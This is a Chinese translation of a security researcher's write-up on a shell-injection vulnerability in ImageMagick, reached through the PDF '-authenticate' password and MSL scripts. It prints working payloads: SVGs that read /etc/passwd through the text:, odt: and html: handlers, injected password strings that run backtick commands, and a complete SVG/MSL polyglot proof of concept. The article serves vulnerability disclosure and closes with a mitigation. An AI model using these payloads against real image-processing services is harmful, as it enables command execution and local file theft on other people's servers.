> 原文链接: https://www.anquanke.com//post/id/226346 


# 深入分析ImageMagick的Shell注入漏洞


                                阅读量   
                                **215891**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者insert-script，文章来源：insert-script.blogspot.com
                                <br>原文地址：[https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01b7ad02c64959c5b7.png)](https://p1.ssl.qhimg.com/t01b7ad02c64959c5b7.png)



ImageMagick是一款图像处理软件，可以创建、编辑、合成或转换位图图像。该软件支持读取和写入各种格式（超过200种）的图像，其中包括PNG、JPEG、GIF、HEIC、TIFF、DPX、EXR、WebP、Postscript、PDF和SVG，等等。

2016年，相关研究人员指出，ImageMagick不仅功能强大，比如可以读取本地文件，而且可以通过恶意制作的图像来执行shell命令。此后，安全研究人员又爆出ImageMagick对外部程序（ghostscript）的支持功能含有远程执行漏洞。

鉴于过去的研究，我快速考察了ImageMagick所支持的外部程序(libreoffice/openoffice)，并决定深入了解一下IM(ImageMagick)是如何调用外部程序，以及对于shell注入漏洞的修复方式。在此过程中，我不仅发现了一个漏洞，同时还注意到：

1）IM团队真的很活跃，并且试图快速解决任何提出的问题（这一点很重要）。

2）ImageMagick是一个很棒的文件转换工具。它支持一些非常罕见和古老文件类型（通常是通过外部程序来提供支持的），并尽可能地对使用户友好，有时都友好得过头了。 



## ImageMagick、https与cURL。

对于ImageMagick软件来说，delegates.xml文件以及coders文件夹是其重要的组成部分，因为它们与文件的处理方式紧密相关；同时，许多安全问题也出在这里。

其中，delegates.xml文件规定了处理特定文件类型时用于调用外部程序的相关命令和参数。但在此之前，该软件会先通过coders文件夹中的处理程序来解析文件，并确定是否需要调用外部程序（这是一种简化的描述，但在大多数情况下，它的确就是这样工作的）。

由于coders文件夹中含有很多文件，所以，我们决定先来考察一下ImageMagick是如何处理https: URL的，因为我们知道最后会使用curl，而curl很容易受到命令注入漏洞的影响。

简而言之，https:的处理程序是在下面这一行代码中注册的： 

https://github.com/ImageMagick/ImageMagick/blob/master/coders/url.c#L327

如果IM软件需要处理https: URL，则会调用以下分支： 

https://github.com/ImageMagick/ImageMagick/blob/master/coders/url.c#L157

```
status=InvokeDelegate(read_info,image,"https:decode",(char *) NULL,
```

然后，InvokeDelegate调用InterpretDelegateProperties，后者会调用GetMagickPropertyLetter，之后，GetMagickPropertyLetter继续调用SanitizeDelegateString。 

```
whitelist[] =

"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 "

"$-_.+!;*(),`{``}`|\\^~[]`\"&gt;&lt;#%/?:@&amp;=";

[...]

for (p+=strspn(p,whitelist); p != q; p+=strspn(p,whitelist))

*p='_';

return(sanitize_source);
```

在非windows系统上，这个函数会用“_”代替’（单引号）（我认为这是默认的功能）。这一点很重要，因为最后会调用ExternalDelegateCommand。而这个函数用于处理对外部可执行文件的调用。根据delegates.xml中定义的curl命令，用户定义的URL将用单引号括起来。由于之前已经过滤了单引号，所以，无法注入额外的shell命令。

为了验证这一点，我修改了IM的源码，并加入一些printf语句来转储创建的命令。

同时，我们假设一个SVG或MVG指定了一个如下所示的https：URL。 

```
&lt;svg width="200" height="200"

xmlns:xlink="http://www.w3.org/1999/xlink"&gt;

xmlns="http://www.w3.org/2000/svg"&gt;

&lt;image xlink:href="https://example.com/test'injection" height="200" width="200"/&gt;

&lt;/svg&gt;
```

命令行： 

```
convert test.svg out.png
```

ImageMagick软件创建的shell命令如下所示： 

```
curl -s -k -L -o 'IMrandomnumber.dat' 'https://example.com/test_injection'
```

重要提示：如本例所示，不同的编码器可以相互调用，因为在本例中SVG会触发url.c编码器的执行。如果ImageMagick被编译成使用第三方库（比如librsvg）来解析SVG文件，那么，第三方库会自行处理相关协议。在这种情况下，仍然可以通过MSVG支持来触发ImageMagicks自己的SVG解析器： 

```
convert test.msvg out.png
```

此外，ImageMagick还允许通过下面的语法来指定处理程序： 

```
convert msvg:test.svg out.png
```



## 读取本地文件

由于ImageMagick允许设置特定的文件处理程序，具体如上图所示，因此，我决定考察一下哪些处理程序可以用来读取和泄漏本地文件。

在这里，我们假设一个用户控制的SVG文件被IMs内部的SVG解析器转换为PNG文件，然后返回给最终用户。对于这种情形，我们可以在网站的头像上传中遇到。 

```
convert test.svg userfile.png
```

在ImageTragick中已经提到了第一个强大的编码器便是“text:”。该编码器用于将纯文本转换成图像（每页文本对应于一张图像），它是ImageMagick的“paged text”输入运算符。该编码器可以在txt.c中进行注册。 

```
&lt;svg width="1000" height="1000"

xmlns:xlink="http://www.w3.org/1999/xlink"&gt;

xmlns="http://www.w3.org/2000/svg"&gt;

&lt;image xlink:href="text:/etc/passwd" height="500" width="500"/&gt;

&lt;/svg&gt;
```

另一个读取/etc/passwd的例子是基于LibreOffice的。这是可以做到的，因为LibreOffice支持文本文件的渲染。由于ImageMagick不支持这种文件类型，所以，它会通过delegates.xml中的decode属性找到相应的协议处理程序。

当然，这种攻击手法只适用于安装了OpenOffice/LibreOffice的情形： 

```
&lt;svg width="1000" height="1000"

xmlns:xlink="http://www.w3.org/1999/xlink"&gt;

xmlns="http://www.w3.org/2000/svg"&gt;

&lt;image xlink:href="odt:/etc/passwd" height="500" width="500"/&gt;

&lt;/svg&gt;
```

如果安装了html2ps，也可以使用“html:”。虽然ImageMagick注册了一个“HTML”处理程序，但它只设置了一个编码器条目。并且，这些编码器只负责文件类型的创建/写入工作，而不负责读取工作（这是由解码器完成的）。因此，可以在delegates.xml中通过下列方式使用该解码器： 

```
&lt;svg width="1000" height="1000"

xmlns:xlink="http://www.w3.org/1999/xlink"&gt;

xmlns="http://www.w3.org/2000/svg"&gt;

&lt;image xlink:href="html:/etc/passwd" height="500" width="500"/&gt;

&lt;/svg&gt;
```

接下来，让我们回到shell注入上面来。



## 切入点：加密的PDF

在了解了curl的用法后，我又考察了command在delegates.xml中的相关定义： 

```
&lt;delegate decode="https:decode"

command="&amp;quot;@WWWDecodeDelegate@&amp;quot; -s -k -L -o &amp;quot;%u.dat&amp;quot; &amp;quot;https:%M&amp;quot;"/&gt;
```

其中，%M被替换为用户控制的URL。因此，我检查了%M的所有出现位置，以及它们是否被正确处理。此外，我还查看了定义在property.c中的所有替换值，最终没有发现任何注入漏洞。

之后，我在pdf.编码器中偶然发现了下面的内容： 

```
(void) FormatLocaleString(passphrase,MagickPathExtent,

"\"-sPDFPassword=%s\" ",option);
```

这似乎设置了一个密码，因此，这很可能是由用户完全控制的，所以，我查了一下这个参数设置是如何设置的，以及是否可以利用。根据变更日志，ImageMagick在2017年增加了一个“-authenticate”命令行参数，允许用户为加密的PDF设置密码。

因此，我通过以下命令对其进行了测试，这里将转储创建的命令： 

```
convert -authenticate "password" test.pdf out.png
```

创建的Shell命令： 

```
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4

-dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=password" '-sOutputFile=/tmp/magick-YPvcqDeC7K-Q8xn8VZPwHcp3G1WVkrj7%d' '-f/tmp/magick-sxCQc4-ip-mnuSAhGww-6IFnRQ46CBpD' '-f/tmp/magick-pU-nIhxrRulCPVrGEJ868knAmRL8Jfw9'
```

由于我们已经确认密码包含在创建的gs命令中（该命令用于解析指定的PDF），因此，现在是时候检查双引号的处理是否正确了： 

```
convert -authenticate 'test" FFFFFF' test.pdf out.png

'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4

-dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=test" FFFFFF" '-sOutputFile=/tmp/magick-YPvcqDeC7K-Q8xn8VZPwHcp3G1WVkrj7%d' '-f/tmp/magick-sxCQc4-ip-mnuSAhGww-6IFnRQ46CBpD' '-f/tmp/magick-pU-nIhxrRulCPVrGEJ868knAmRL8Jfw9
```

令人惊讶的是，我们竟然能够提前关闭-sPDFPassword参数，这使我们能够提供额外的shell命令。其中，指定的“password”必须包含字符”&amp;;&lt;&gt;|”中的一个，这样shell注入漏洞才会被真正触发。之所以如此，是因为只有存在上述字符的情况下，ImageMagick才会使用系统调用（即系统shell）： 

```
if ((asynchronous != MagickFalse) ||

(strpbrk(sanitize_command,"&amp;;&lt;&gt;|") != (char *) NULL))

status=system(sanitize_command);
```

因此，我测试了以下命令： 

```
convert -authenticate 'test" `echo $(id)&gt; ./poc`;"' test.pdf out.png
```

创建的Shell命令： 

```
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4

-dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=test" `echo $(id)&gt; ./poc`;"" '-sOutputFile=/tmp/magick-pyNxb2vdkh_8Avwvw0OlVhu2EfI3wSKl%d' '-f/tmp/magick-IxaYR7GhN3Sbz-299koufEXO-ccxx46u' '-f/tmp/magick-GXwZIbtEu63vyLALFcqHd2c0Jr24iitE'
```

如上所示，这里已创建文件“poc”，其中包含id命令的输出。这样，就可以确认存在shell注入漏洞了。

但是，这里的问题是：用户不太可能去设置authenticate参数。因此，我决定寻找更好的PoC。



## 漏洞利用：MSL与Polyglots

现在，我需要找到一种通过受支持的文件类型设置“-authenticate”参数的方法，并且我已经知道在哪里寻找：ImageMagick脚本语言（MSL）。MSL可以用来设置输入文件、输出文件和其他参数。同时，我们可以在此处找到相应的示例文件，下面是一个简化版本： 

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;image&gt;

&lt;read filename="image.jpg" /&gt;

&lt;get width="base-width" height="base-height" /&gt;

&lt;resize geometry="400x400" /&gt;

&lt;write filename="image.png" /&gt;

&lt;/image&gt;
```

ImageMagick团队称，这种文件格式还没有正确的说明文档，因此，我检查了受支持的属性相关的源代码。我很快在MSL编码器的源代码中发现了下面的内容： 

```
if (LocaleCompare(keyword,"authenticate") == 0)

`{`

(void) CloneString(&amp;image_info-&gt;density,value);

break;

`}`
```

经过一番折腾，我发现该路径可以处理任何设置了authenticate属性的标记。但是代码将定义的值分配给了density属性，这是没有任何意义的。在研究了其余的MSL代码后，我得出以下结论：

1）这段代码应该是想要设置authenticate属性，类似于”-authenticate”命令行参数。

2）代码是错误的，因此阻止了滥用shell注入的可能性。

因此，我决定做一些以前从未做过的事情：通过Github提交此问题，看看能否得到解决。为此，我创建了一个新的github帐户：https://github.com/ImageMagick/ImageMagick/discussions/2779。

最后，代码被正确修复了： 

```
if (LocaleCompare(keyword,"authenticate") == 0)

`{`

(void) SetImageOption(image_info,keyword,value);

break;

`}`
```

我立即创建了一个PoC MSL脚本来验证是否可以利用shell注入漏洞。注意，必须指定msl:协议处理程序，这样IM才能正确地解析脚本文件： 

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;image authenticate='test" `echo $(id)&gt; ./poc`;"'&gt;

&lt;read filename="test.pdf" /&gt;

&lt;get width="base-width" height="base-height" /&gt;

&lt;resize geometry="400x400" /&gt;

&lt;write filename="out.png" /&gt;

&lt;/image&gt;

convert msl:test.msl whatever.png
```

它成功了：创建了“PoC”文件，从而验证了shell注入漏洞的可利用性。

最后一步：将所有内容打包到一个SVG polyglot文件中。



## SVG MSL polyglot文件

我创建的polyglot文件其实就是一个SVG文件，它将自身加载为MSF文件，以触发shell注入漏洞。这个SVG polyglot文件如下所示： 

poc.svg:

```
&lt;image authenticate='ff" `echo $(id)&gt; ./0wned`;"'&gt;

&lt;read filename="pdf:/etc/passwd"/&gt;

&lt;get width="base-width" height="base-height" /&gt;

&lt;resize geometry="400x400" /&gt;

&lt;write filename="test.png" /&gt;

&lt;svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;

&lt;image xlink:href="msl:poc.svg" height="100" width="100"/&gt;

&lt;/svg&gt;

&lt;/image&gt;
```

首先，SVG结构具有一个image根标签。由于解析器并没有强制要求SVG标签是根标签，所以，IM将这个文件解析为SVG是没有问题的。此外，这个SVG结构还指定了一个图像URL，它使用的是msl:poc.svg。这就是告诉ImageMagick要用MSL编码器来加载poc.svg。

虽然MSF是一个基于XML的结构，但MSF编码器并没有部署一个真正的XML解析器。相反，它只要求文件以它支持的标签开头。同时，我使用的另一个技巧存在于read标签中。这里有一个限制：只有PDF文件才会触发该漏洞。为了绕过这个限制，这里规定为任何已知的本地文件，并使用pdf:协议处理程序来确保它被当作PDF文件对待。

PoC文件的演示动画如下所示： 

[![](https://p0.ssl.qhimg.com/t016a5d1fd49f0eec53.gif)](https://p0.ssl.qhimg.com/t016a5d1fd49f0eec53.gif)

当然，这个PoC仍然不完美，因为我们必须假设文件名不会发生变化，因为文件必须能够引用自身。但我觉得现在这样就够了。



## 小结

显然，这个漏洞仅在ImageMagick没有使用处理PDF解析的第三方库进行编译的情况下才有效。

此外，用户必须能够通过命令行或MSL（如我的PoC文件所示）设置“authenticate”参数。

如果ImageMagick不能处理PDF文件，可以通过policy.xml文件禁用PDF编码器，从而阻止shell注入攻击。关于如何配置policy.xml的详细介绍，请参见https://imagetragick.com/。 
